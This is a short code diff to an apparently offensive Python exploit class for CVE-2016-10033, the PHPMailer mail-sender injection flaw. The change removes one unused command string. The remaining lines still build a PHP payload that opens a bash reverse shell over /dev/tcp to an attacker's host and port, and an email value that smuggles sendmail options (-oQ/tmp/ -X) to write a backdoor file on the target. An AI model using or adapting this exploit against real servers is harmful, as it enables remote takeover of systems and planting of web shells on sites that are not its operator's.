@@ -18,7 +18,6 @@ class CVE2016_10033:
 
     def exploit(self):
         print (LogColors.BLUE + "exploitation..." + LogColors.ENDC)
-        cmd = "bash -i >& /dev/tcp/{}/{} 0>&1".format(self.host, self.port)
         payload = "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'\"); ?>".format(self.host, self.port)
         email = "\"cocomelonc@127.0.0.1\" -oQ/tmp/ -X" + self.backdoor + " root\"@hack.com"
         data = {"email" : email, "text" : payload, "subject" : "hack :)"}
